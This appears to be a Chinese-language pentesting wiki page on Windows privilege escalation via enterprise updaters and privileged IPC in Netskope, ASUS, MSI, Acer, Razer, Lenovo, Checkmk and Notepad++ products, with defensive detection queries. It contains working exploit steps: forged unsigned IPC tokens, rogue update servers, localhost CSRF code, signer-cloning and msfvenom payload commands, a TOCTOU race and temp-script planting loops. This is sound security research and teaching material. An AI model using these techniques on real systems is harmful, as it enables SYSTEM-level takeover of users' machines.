# 滥用企业自动更新程序和特权 IPC（例如 Netskope、ASUS 和 MSI）

{{#include ../../banners/hacktricks-training.md}}

本页归纳了一类 Windows 本地提权链：这类链条存在于企业终端代理和更新程序中，它们暴露了低门槛的 IPC 接口，并提供特权更新流程。一个典型例子是 Netskope Client for Windows < R129（CVE-2025-0309）：低权限用户可诱使程序向攻击者控制的服务器注册，随后发送恶意 MSI，由 SYSTEM 服务安装。<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

以下关键思路可用于类似产品：
- 滥用特权服务的 localhost IPC，迫使其重新注册或重新配置到攻击者控制的服务器。
- 实现厂商的更新端点，提供恶意 Trusted Root CA，并让更新程序指向恶意的“签名”软件包。
- 绕过薄弱的签名者检查（CN 白名单）、可选摘要标志以及宽松的 MSI 属性检查。
- 如果 IPC 使用了“加密”，可从注册表中全局可读的机器标识符派生密钥/IV。
- 如果服务通过映像路径/进程名称限制调用者，可向白名单进程注入代码，或以挂起状态启动进程，再通过最小化的线程上下文补丁引导加载 DLL。

即使自定义本地 TCP 服务要求输入 PIN 或其他应用凭据，也应对其身份验证和输入边界进行同等审查。将监听端口对应到进程及其有效服务帐户，然后检查实际部署的二进制文件/版本，并确认在复制到固定缓冲区或用于构造子进程命令之前，是否对调用者可控字段进行长度检查。[Microsoft 关于缓冲区溢出的指南](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns)解释了为什么未经检查的外部输入会对特权原生代码构成危险。仅凭环回监听器、硬编码凭据或进程名称，并不能证明存在内存破坏或 SYSTEM 执行；可达性、授权、代码路径和缓解措施仍是彼此独立的条件。常规枚举应保持被动，不要向正在运行的服务发送超长输入来触发崩溃。

---
## 1) 通过 localhost IPC 强制向攻击者控制的服务器注册

许多代理都附带一个用户态 UI 进程，该进程通过 localhost TCP 使用 JSON 与 SYSTEM 服务通信。

在 Netskope 中观察到：
- UI：stAgentUI（低完整性）↔ 服务：stAgentSvc（SYSTEM）
- IPC 命令 ID 148：IDP_USER_PROVISIONING_WITH_TOKEN

利用流程：
1) 构造一个 JWT 注册令牌，其声明可控制后端主机（例如 AddonUrl）。使用 alg=None，因此无需签名。
2) 发送调用注册命令的 IPC 消息，并附上 JWT 和租户名称：

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) 服务开始向你的恶意服务器请求 enrollment/config，例如：
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

注意：
- 如果调用方验证基于路径/名称，请使用列入允许列表的 vendor binary 发起请求（见 §4）。<sup>[[1]](#references)[[2]](#references)</sup>

### 暴露于网络的管理 IPC

此信任边界并不总是局限于 localhost。在报告的 MyReport Updater 2.1.1 案例中，一个 `LocalSystem` 服务监听所有接口，并接受未经身份验证的 gRPC 配置更改，可修改 reference host、端口和运行模式。对于远程利用方式，既需要能够访问该监听器，也需要服务能够向所选 reference 发起出站连接。应分别评估这些条件，不要将其与后续 package 流程是否能够突破文件写入边界混为一谈。<sup>[[16]](#references)</sup>

---
## 2) 劫持更新通道，以 SYSTEM 身份运行代码

客户端开始与服务器通信后，实现其所需的 endpoints，并引导它获取攻击者提供的 MSI。典型流程：

1) /v2/config/org/clientconfig → 返回 JSON 配置，将 updater interval 设得非常短，例如：
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → 返回 PEM CA 证书。服务会将其安装到 Local Machine Trusted Root 存储区。
3) /v2/checkupdate → 提供指向恶意 MSI 的元数据和一个伪造版本。

绕过常见的检查方式：
- Signer CN allow-list：服务可能只检查 Subject CN 是否等于 “netSkope Inc” 或 “Netskope, Inc.”。你的 rogue CA 可以签发带有该 CN 的叶证书，并用它签署 MSI。
- CERT_DIGEST 属性：加入一个名为 CERT_DIGEST 的无害 MSI 属性。安装时不会强制验证该属性。
- 可选摘要验证：配置标志（例如 check_msi_digest=false）可禁用额外的加密验证。

结果：SYSTEM 服务会安装来自
C:\ProgramData\Netskope\stAgent\data\*.msi
的 MSI，并以 NT AUTHORITY\SYSTEM 身份执行任意代码。<sup>[[1]](#references)[[2]](#references)</sup>

绕过补丁的经验：如果供应商的应对方式是允许少数几个“可信”域名，而不是通过加密方式验证更新源，就应查找供应商自有的重定向器或反向代理，看看能否继续通过它们引导流量。在 Netskope 的案例中，后续公开研究表明，R129 时代的 allow-list 仍可通过 `rproxy.goskope.com` 绕过；该代理会转发攻击者控制的 Azure App Service 内容。应将主机名 allow-list 视为障碍，而非信任边界。<sup>[[14]](#references)</sup>

另一种失效模式是**自洽但未经身份验证的包元数据**。在 MyReport 案例中，攻击者控制的引用地址提供了修改后的存档，而中间人修改了供应商的 MD5 摘要和大小响应，再将其发送给更新程序。匹配这些值只能验证响应的一致性，不能验证其是否来自供应商；无需利用 MD5 碰撞。由调用方选择的安装目录随后使特权解压操作成为文件写入边界。由此产生的 DLL 加载原语详见[将任意文件写入串联为 DLL 劫持](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack)。<sup>[[16]](#references)</sup>

---
## 3) 伪造加密 IPC 请求（如存在）

从 R127 开始，Netskope 将 IPC JSON 封装在一个看起来像 Base64 的 encryptData 字段中。逆向分析发现，它使用 AES，密钥和 IV 来源于任何用户都能读取的注册表值：
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

攻击者可以复现加密过程，并以标准用户身份发送有效的加密命令。<sup>[[1]](#references)[[2]](#references)</sup> 一般提示：如果代理突然开始对 IPC 进行“加密”，就检查 HKLM 下的设备 ID、产品 GUID、安装 ID 等是否被用作加密材料。

---
## 4) 绕过 IPC 调用方 allow-list（路径/名称检查）

某些服务会尝试通过解析 TCP 连接对应的 PID，并将映像路径/名称与位于 Program Files 下、列入 allow-list 的供应商二进制文件（例如 stagentui.exe、bwansvc.exe、epdlp.exe）进行比对，从而验证对端身份。

两种实用的绕过方式：
- 向列入 allow-list 的进程（例如 nsdiag.exe）注入 DLL，并在进程内部代理 IPC。
- 以挂起状态启动列入 allow-list 的二进制文件，并在不使用 CreateRemoteThread 的情况下引导加载代理 DLL（见 §5），以满足驱动强制执行的防篡改规则。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) 兼容防篡改保护的注入：挂起进程 + NtContinue 补丁

产品通常会部署 minifilter/OB callbacks 驱动程序（例如 Stadrv），从指向受保护进程的句柄中移除危险权限：
- 进程：移除 PROCESS_TERMINATE、PROCESS_CREATE_THREAD、PROCESS_VM_READ、PROCESS_DUP_HANDLE、PROCESS_SUSPEND_RESUME
- 线程：限制为 THREAD_GET_CONTEXT、THREAD_QUERY_LIMITED_INFORMATION、THREAD_RESUME、SYNCHRONIZE

一种遵守这些限制的可靠用户态加载器：
1) 使用 CREATE_SUSPENDED 创建供应商二进制文件的进程。
2) 获取仍被允许的句柄：进程句柄具有 PROCESS_VM_WRITE | PROCESS_VM_OPERATION 权限，线程句柄具有 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT 权限（或者，如果你在已知 RIP 处修补代码，则只需 THREAD_RESUME）。
3) 将 ntdll!NtContinue（或其他较早加载且可确保映射的 thunk）覆写为一段简短的 stub；该 stub 调用 LoadLibraryW 加载你的 DLL 路径，然后跳回原处。
4) 调用 ResumeThread，在进程内部触发该 stub，从而加载你的 DLL。

由于你没有对一个已受保护的进程使用 PROCESS_CREATE_THREAD 或 PROCESS_SUSPEND_RESUME（该进程是由你创建的），因此符合驱动程序的策略。<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) 实用工具
- NachoVPN（Netskope 插件）可自动创建 rogue CA、签署恶意 MSI，并提供所需端点：/v2/config/org/clientconfig、/config/ca/cert、/v2/checkupdate。<sup>[[3]](#references)</sup>
- UpSkope 是一个自定义 IPC 客户端，可构造任意（可选 AES 加密的）IPC 消息，并包含挂起进程注入功能，以便从列入 allow-list 的二进制文件发起通信。<sup>[[4]](#references)</sup>

## 7) 未知更新程序/IPC 攻击面快速分诊流程

面对新的端点代理或主板“助手”套件时，通常只需快速检查一遍，就能判断它是否是有潜力的 privesc 目标：<sup>[[6]](#references)</sup>

1) 枚举 loopback 监听器，并将其对应到供应商进程：

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) 枚举候选命名管道：

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) 挖掘插件式 IPC 服务器使用的注册表路由数据：

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) 首先从用户模式客户端中提取 endpoint 名称、JSON 键和 command ID。打包后的 Electron/.NET 前端经常会 leak 完整 schema：

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) 寻找真正的信任判定条件，而不仅仅是最终启动进程的代码路径：

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

值得优先关注的模式：
- 仅使用 `CryptQueryObject`/证书解析而不调用 `WinVerifyTrust`，通常意味着把“证书存在”当成了“证书可信”，从而可能利用证书克隆或其他伪造签名者的技巧。
- 对 `Origin`、`Referer`、下载 URL、进程名或签名者 CN 进行子串/后缀检查并非身份验证。`contains(".vendor.com")` 通常可被攻击者控制的仿冒域名利用。
- 如果低权限 GUI 决定“文件可信”，而 SYSTEM broker 只消费这个结果，那么修补或重实现客户端 DLL/JS 通常就能完全绕过这道边界（Razer 式的分离验证）。
- 如果 broker 将 payload 复制到 `%TEMP%`/`C:\Windows\Temp`，然后从该路径验证或安排执行，应立即测试 TOCTOU 替换窗口，以及是否存在提供了检查较弱的备用 `ExecuteTask()` 封装的同级插件模块。<sup>[[6]](#references)</sup>

对于大量使用命名管道的目标，PipeViewer 可以快速发现弱 DACL 和可远程访问的管道，让你在深入逆向协议之前先定位目标。<sup>[[11]](#references)</sup>

如果目标仅通过 PID、映像路径或进程名验证调用方，应将其视为减速带，而非安全边界：注入合法客户端，或从允许列表中的进程发起连接，通常就足以通过服务器检查。对于命名管道，[此页面介绍了客户端模拟和管道滥用](named-pipe-client-impersonation.md)，对相关原语有更深入的说明。

对于特权 **清理或恢复 broker**，除了管道 ACL，还要检查路径信任边界。即使服务可执行文件及其安装目录受到保护，低权限调用方仍可能在共享目录中选择恢复目标，或重命名暂存的备份文件。应分别确认调用方能否访问恢复命令、能否修改确切的暂存输入或文件名、broker 是否以更高权限身份运行，以及其恢复操作是否确实写入所选的受保护路径。仅有可写暂存目录或可读管道，并不能证明存在任意特权写入；目标路径映射和服务行为需要通过代码审查或受控测试来确认。被动枚举时不要调用未知的清理命令，因为它可能会删除用户文件。

---
## 8) 仅通过供应商签名进行身份验证的模块化插件 broker（Lenovo Vantage 模式）

一种值得关注的新变体是**签名客户端 RPC broker**：低权限的 Lenovo 签名桌面进程与 SYSTEM 服务通信，而该服务会将 JSON 命令路由到 `%ProgramData%` 下由 XML 描述的一组插件。一旦在任何受信任的签名客户端**内部**实现代码执行，每个 `runas="system"` 契约都会成为你的攻击面。<sup>[[15]](#references)</sup>

Lenovo Vantage 研究中发现的高价值原语：
- **因为调用方由供应商签名就信任它**：研究人员将 Lenovo 签名的 EXE 复制到可写目录，并满足 DLL 侧载条件（`profapi.dll`），从而在服务已信任的客户端中运行任意代码，进入经过身份验证的上下文。
- **通过清单发现攻击面**：插件在 `C:\ProgramData\Lenovo\Vantage\Addins\*.xml` 下声明；多个契约以 `SYSTEM` 身份运行，因此枚举这些清单通常比逆向 broker 本身更快地找出真正的特权操作。
- **经过身份验证的通道后仍存在逐命令漏洞**：进入受信任客户端后，公开研究发现更新/安装操作中存在路径遍历和竞争条件、特权设置数据库可被原始 SQL 滥用，以及基于子串的注册表路径检查可导致写入预期 hive 之外的位置。

目标上的有效侦察：

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

实用要点：只要某个 helper suite 暴露了一个 broker，先对 **调用方进程**进行身份验证，然后再分发到数十个 plugin/add-in 命令，就不要在绕过入口信任检查后止步。转储 manifest/contract 表，并分别 fuzz 每个高权限动词；经过身份验证的通道通常还隐藏着多个第二阶段漏洞。

---
## 1) 针对特权 HTTP API 的浏览器到 localhost CSRF（ASUS DriverHub）

DriverHub 附带一个用户模式 HTTP 服务（ADU.exe），监听 127.0.0.1:53000，并要求浏览器请求来自 https://driverhub.asus.com。其 Origin 过滤器会对 Origin 标头以及 `/asus/v1.0/*` 暴露的下载 URL 执行 `string_contains(".asus.com")`。因此，任何攻击者控制的主机（例如 `https://driverhub.asus.com.attacker.tld`）都会通过检查，并能通过 JavaScript 发出会改变状态的请求。<sup>[[6]](#references)</sup> 更多绕过模式请参阅 [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md)。

实操流程：
1) 注册一个包含 `.asus.com` 的域名，并在该域名上托管恶意网页。
2) 使用 `fetch` 或 XHR 调用 `http://127.0.0.1:53000` 上的特权端点（例如 `Reboot`、`UpdateApp`）。
3) 发送处理程序所需的 JSON 请求体——打包后的前端 JS 展示了以下 schema。

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

即使将 Origin header 伪装成受信任的值，下面展示的 PowerShell CLI 也能成功：

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

因此，访问攻击者站点的任何浏览器都会触发一个 1-click（或通过 `onload` 实现 0-click）的本地 CSRF，进而驱动一个 SYSTEM helper。

---
## 2) 不安全的代码签名验证与证书克隆 (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` 会下载 JSON 请求体中指定的任意可执行文件，并将其缓存到 `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`。下载 URL 验证复用了相同的子字符串逻辑，因此 `http://updates.asus.com.attacker.tld:8000/payload.exe` 会被接受。下载后，ADU.exe 只会检查 PE 文件是否包含签名，以及 Subject 字符串是否与 ASUS 匹配，然后便运行该文件——既不调用 `WinVerifyTrust`，也不验证证书链。

要利用这一流程：
1) 创建 payload（例如，`msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`）。
2) 将 ASUS 的签名者克隆到其中（例如，`python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`）。
3) 将 `pwn.exe` 托管在一个仿冒 `.asus.com` 的域名上，并通过上文的浏览器 CSRF 触发 UpdateApp。

由于 Origin 和 URL 过滤器都基于子字符串匹配，而签名者检查只比较字符串，DriverHub 会在其提升后的上下文中下载并执行攻击者的二进制文件。<sup>[[6]](#references)</sup>

---
## 1) 更新程序复制/执行路径中的 TOCTOU (MSI Center CMD_AutoUpdateSDK)

MSI Center 的 SYSTEM 服务提供了一种 TCP 协议，每个帧的格式为 `4-byte ComponentID || 8-byte CommandID || ASCII arguments`。核心组件（Component ID `0f 27 00 00`）包含 `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`。其处理程序会：
1) 将提供的可执行文件复制到 `C:\Windows\Temp\MSI Center SDK.exe`。
2) 通过 `CS_CommonAPI.EX_CA::Verify` 验证签名（证书 Subject 必须等于 “MICRO-STAR INTERNATIONAL CO., LTD.”，且 `WinVerifyTrust` 验证成功）。
3) 创建一个计划任务，以 SYSTEM 身份使用攻击者控制的参数运行临时文件。

在验证与 `ExecuteTask()` 之间，复制的文件不会被锁定。攻击者可以：
- 发送指向合法 MSI 签名二进制文件的 Frame A（确保签名检查通过并将任务加入队列）。
- 通过反复发送指向恶意 payload 的 Frame B 消息与其竞速，在验证完成后立即覆盖 `MSI Center SDK.exe`。

计划任务触发时，会以 SYSTEM 身份执行被覆盖的 payload，尽管最初验证的是原始文件。可靠的利用方式是使用两个 goroutine/线程反复发送 CMD_AutoUpdateSDK，直到赢得 TOCTOU 竞态窗口。<sup>[[6]](#references)</sup>

---
## 2) 滥用自定义 SYSTEM 级 IPC 与 impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- `MSI.CentralServer.exe` 加载的每个插件/DLL 都会获得一个 Component ID，该 ID 存储在 `HKLM\SOFTWARE\MSI\MSI_CentralServer` 下。帧的前 4 个字节用于选择该组件，使攻击者能够将命令路由到任意模块。
- 插件可以定义自己的任务运行器。`Support\API_Support.dll` 暴露了 `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}`，并直接调用 `API_Support.EX_Task::ExecuteTask()`，**不进行任何签名验证**——任何本地用户都可以将其指向 `C:\Users\<user>\Desktop\payload.exe`，从而稳定地获得 SYSTEM 执行权限。
- 使用 Wireshark 嗅探 loopback，或在 dnSpy 中分析 .NET 二进制文件，可以快速发现 Component 与 command 的对应关系；之后便可使用自定义 Go/Python 客户端重放帧。<sup>[[6]](#references)</sup>

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe`（SYSTEM）暴露了 `\\.\pipe\treadstone_service_LightMode`，其 discretionary ACL 允许远程客户端连接（例如，`\\TARGET\pipe\treadstone_service_LightMode`）。发送带有文件路径的 command ID `7` 会调用该服务的进程创建例程。
- 客户端库会将一个 magic terminator byte（113）与参数一起序列化。使用 Frida/`TsDotNetLib` 进行动态分析（仪器分析技巧请参阅 [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)）可知，原生处理程序会将此值映射到 `SECURITY_IMPERSONATION_LEVEL` 和 integrity SID，然后调用 `CreateProcessAsUser`。
- 将 113（`0x71`）替换为 114（`0x72`），会进入通用分支，该分支保留完整的 SYSTEM token，并设置高完整性 SID（`S-1-16-12288`）。因此，生成的二进制文件会以不受限制的 SYSTEM 身份运行，无论是在本机还是跨机器。
- 结合暴露的安装程序标志（`Setup.exe -nocheck`），即使在实验室 VM 上也能部署 ACC 并测试该管道，无需厂商硬件。<sup>[[6]](#references)</sup>

这些 IPC 漏洞说明了为什么 localhost 服务必须实施双向身份验证（ALPC SIDs、`ImpersonationLevel=Impersonation` 过滤器、token 过滤），以及为什么每个模块的“运行任意二进制文件” helper 都必须采用相同的签名者验证。

---
## 3) 基于薄弱用户态验证的 COM/IPC “elevator” helpers (Razer Synapse 4)

Razer Synapse 4 为这类问题提供了另一个值得关注的模式：低权限用户可以请求 COM helper 通过 `RzUtility.Elevator` 启动进程，而信任判定由用户态 DLL（`simple_service.dll`）负责，而不是在特权边界内得到可靠执行。

观察到的利用路径：
- 实例化 COM 对象 `RzUtility.Elevator`。
- 调用 `LaunchProcessNoWait(<path>, "", 1)` 请求提升权限启动。
- 在公开的 PoC 中，发起请求前会修补掉 `simple_service.dll` 中的 PE 签名检查，从而允许启动攻击者任意指定的可执行文件。<sup>[[6]](#references)[[10]](#references)</sup>

最简 PowerShell 调用：

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

总体结论：逆向分析“helper”套件时，不要只检查 localhost TCP 或 named pipes。还要检查名称类似 `Elevator`、`Launcher`、`Updater` 或 `Utility` 的 COM classes，然后确认高权限服务是否会自行验证目标二进制文件，还是仅信任由可被 patch 的 user-mode client DLL 计算出的结果。这种模式并不限于 Razer：任何由高权限 broker 使用低权限端的 allow/deny 决策的拆分式设计，都可能存在 privesc 攻击面。


---
## MSI repair 期间可预测的临时脚本执行（Checkmk Agent / CVE-2024-0670）

一些 Windows agent 仍会通过在 `C:\Windows\Temp` 写入临时 `.cmd` 文件，并以 `SYSTEM` 身份执行，来实现特权操作。如果文件名可预测，且服务未能安全地重新创建已有文件，低权限用户就能预先创建未来会用到的临时文件并将其设为**只读**，使特权进程执行攻击者控制的内容，而不是自己的脚本。

在易受攻击的 Checkmk Agent 构建版本中观察到：
- 临时文件模式：`cmk_all_<PID>_1.cmd`
- 受影响分支：`2.0.0`、`2.1.0`、`2.2.0`
- 触发方式：对缓存的 agent 软件包执行 MSI **repair**<sup>[[8]](#references)[[9]](#references)</sup>

实用流程：
1. 根据当前进程 ID 或正在运行的 agent PID，估算一个合理的 PID 范围。
2. 编写简短的 **ASCII** `.cmd` payload（使用 `Set-Content -Encoding Ascii` 或通过 `cmd.exe` 重定向；避免使用 PowerShell 输出的 UTF-16 编码批处理文件）。
3. 在候选范围内批量写入 `C:\Windows\Temp\cmk_all_<PID>_1.cmd`，并将每个文件设为只读。
4. 触发缓存 MSI 的 repair，使特权服务尝试重新生成临时脚本并执行它。<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

如果易受攻击的产品是通过 Windows Installer 安装的，请在触发修复前，将 `C:\Windows\Installer` 下名称看起来随机的缓存 MSI 文件对应到其产品名称：<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

操作说明：
- 当 `msiexec /fa` 在非交互式 WinRM shell 中失败，而你需要判断现有桌面会话或断开连接的会话是否能正确触发修复时，`qwinsta` 很有用。<sup>[[7]](#references)</sup>
- 此模式也适用于其他端点代理和更新程序：它们会**将临时脚本放在所有用户可写的位置，之后再以 SYSTEM 身份执行**。检查文件名是否可预测、是否缺少独占创建语义，以及修复/更新流程能否按需触发。

### 交互式安装程序修复和特权控制台

PDF24 Creator 11.15.1 展示了另一种 MSI 修复风险：修复期间，其打印机安装自定义操作可能会以 SYSTEM 权限启动一个可见控制台。供应商在 11.15.2 中更改了 MSI 安装程序，以解决此行为。旧版产品只能作为初步排查线索。检查已注册或可访问的 MSI 软件包、此用户能否启动修复、是否存在易受攻击的自定义操作和日志文件延迟，以及交互式桌面是否会显示该控制台。报告中使用了针对 `faxPrnInst.log` 的 oplock 来实现延迟；普通的文件可写权限并非唯一访问条件。非交互式 shell、无法访问的软件包或已修补的安装程序都可能导致攻击链中断。此问题不依赖 `AlwaysInstallElevated`，且不同于替换可预测的临时脚本。

---
## 通过弱更新程序验证进行远程供应链劫持（WinGUp / Notepad++）

2025 年 6 月至 2025 年 12 月期间，入侵 Notepad++ 更新流程背后托管基础设施的攻击者，向特定受害者选择性地提供恶意清单。较旧的 WinGUp 更新程序未能完全验证更新的真实性，因此恶意 XML 响应可将客户端重定向到攻击者控制的 URL。由于客户端接受了 HTTPS 内容，却未强制验证受信任的证书链和下载程序的有效 PE 签名，受害者下载并执行了木马化的 NSIS `update.exe`。<sup>[[12]](#references)[[13]](#references)</sup>

操作流程（无需本地漏洞利用）：
1. **基础设施拦截**：入侵 CDN/托管服务，并在响应更新检查时提供指向恶意下载 URL 的攻击者元数据。
2. **木马化 NSIS**：安装程序下载/执行 payload，并利用两条执行链：
   - **自带签名二进制文件 + sideload**：捆绑已签名的 Bitdefender `BluetoothService.exe`，并在其搜索路径中放置恶意 `log.dll`。已签名的二进制文件运行时，Windows 会 sideload `log.dll`，由其解密并反射加载 Chrysalis 后门（使用 Warbird 保护和 API hashing 来阻碍静态检测）。
   - **脚本化 shellcode 注入**：NSIS 执行编译后的 Lua 脚本，使用 Win32 API（例如 `EnumWindowStationsW`）注入 shellcode 并部署 Cobalt Strike Beacon。<sup>[[12]](#references)</sup>

任意自动更新程序的加固/检测要点：
- 强制验证下载程序的**证书和签名**（固定供应商签名者，拒绝不匹配的 CN/证书链），并对更新清单本身进行签名（例如使用 XMLDSig）。除非经过验证，否则应阻止由清单控制的重定向。
- 将**自带签名二进制文件 sideload**视为下载后的检测切入点：当已签名的供应商 EXE 从其标准安装路径之外加载 DLL（例如 Bitdefender 从 Temp/Downloads 加载 `log.dll`），或更新程序从临时目录放置/执行非供应商签名的安装程序时，发出告警。
- 监控此攻击链中观察到的**恶意软件特定特征**（可用作通用排查切入点）：互斥体 `Global\Jdhfv_1.0.1`、`gup.exe` 对 `%TEMP%` 的异常写入，以及由 Lua 驱动的 shellcode 注入阶段。
- Notepad++ 从 v8.8.9 起加强了 WinGUp：现在返回的 XML 会经过签名（XMLDSig），较新的版本还会强制验证下载程序的证书和签名，而不再只信任传输过程。<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – Bitdefender 签名 EXE sideloading <code>log.dll</code>（T1574.001）</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```

</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> 启动非 Notepad++ 安装程序</summary>

```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```

</details>

这些模式适用于任何接受未签名清单或未能固定安装程序签名者的更新程序——网络劫持 + 恶意安装程序 + 使用自有签名的旁加载，可在“可信”更新的幌子下实现远程代码执行。

---
## References
- [1] [安全公告 – Netskope Client for Windows – 通过恶意服务器实现本地权限提升 (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [2] [Netskope 安全公告 NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [3] [NachoVPN – Netskope 插件](https://github.com/AmberWolfCyber/NachoVPN)
- [4] [UpSkope – Netskope IPC 客户端/漏洞利用工具](https://github.com/AmberWolfCyber/UpSkope)
- [5] [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [6] [SensePost – 攻破 ASUS DriverHub、MSI Center、Acer Control Centre 和 Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [7] [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [8] [SEC Consult – 利用 Checkmk Agent 中的可写文件实现本地权限提升](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [9] [Checkmk Werk #16361 – Windows 代理中的权限提升](https://checkmk.com/werk/16361)
- [10] [sensepost/bloatware-pwn 概念验证代码](https://github.com/sensepost/bloatware-pwn)
- [11] [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [12] [Unit 42 – 国家级攻击者利用 Notepad++ 供应链](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [13] [Notepad++ – 基础设施遭劫持事件更新](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [14] [AmberWolf – 绕过 Netskope Client for Windows 中 CVE-2025-0309 的修复](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
